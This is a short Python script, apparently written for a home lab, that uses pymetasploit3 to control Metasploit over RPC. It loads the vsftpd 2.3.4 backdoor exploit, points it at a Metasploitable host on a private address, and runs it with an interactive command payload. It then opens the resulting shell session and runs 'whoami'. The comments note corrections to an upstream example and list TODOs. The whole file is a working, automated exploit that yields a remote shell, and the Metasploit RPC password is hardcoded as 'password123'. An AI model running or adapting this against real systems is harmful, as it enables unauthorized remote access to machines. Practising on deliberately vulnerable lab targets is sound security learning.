'''
based on ...
https://github.com/allfro/pymetasploit
2 issues with that page
    RHOST should be RHOSTS
    the session passed to the shell should be '1' and not 1 (no qoutes)
TODO
start rpc w/ random password
refine session id (dict)
check out multiple payloads (search options, etc.)
argparse
'''

from pymetasploit3.msfrpc import *
import time

# start MSFRPC with this:
# msfrpcd -P password123

# help(MsfRpcClient)    # print all options
metasploitableIP = '192.168.56.105'
# define the exploit
tgtExploit = 'unix/ftp/vsftpd_234_backdoor'
# setup the client
client = MsfRpcClient('password123', ssl=True)

'''
MsfRpcClient is segmented into different management modules

    auth: manages the authentication of clients for the msfrpcd daemon.
    consoles: manages interaction with consoles/shells created by Metasploit modules.
    core: manages the Metasploit framework core.
    db: manages the backend database connectivity for msfrpcd.
    modules: manages the interaction and configuration of Metasploit modules (i.e. exploits, auxiliaries, etc.)
    plugins: manages the plugins associated with the Metasploit core.
    sessions: manages the interaction with Metasploit meterpreter sessions.
'''
# prints a lot if info
# print([m for m in dir(client) if not m.startswith('_')])

# list of all the available modules, it's a lot
# print(client.modules.exploits)

# another way
'''
print(client.modules.auxiliary)
print(client.modules.encoders)
print(client.modules.nops)
print(client.modules.payloads)
print(client.modules.post)
'''
# set exploit
exploit = client.modules.use('exploit', tgtExploit)
# print details
'''
print(exploit.description)
print(exploit.authors)
print(exploit.required)
'''
# show the options
# print(exploit.options)

# list payloads
print('Payloads: ' + str(exploit.payloads))
# specify target:
exploit['RHOSTS'] = metasploitableIP
# set verbose option to true, not sure what this does
exploit['VERBOSE'] = True

# execute it
exploit.execute(payload='cmd/unix/interact')

# delay to give it time to establish the connection
for i in range(3, 0, -1):
    print('delay for {}0 seconds'.format(i))
    time.sleep(10)

# list session
print(client.sessions.list)

# test it
shell = client.sessions.session('1')
shell.write('whoami\n')
print(shell.read())
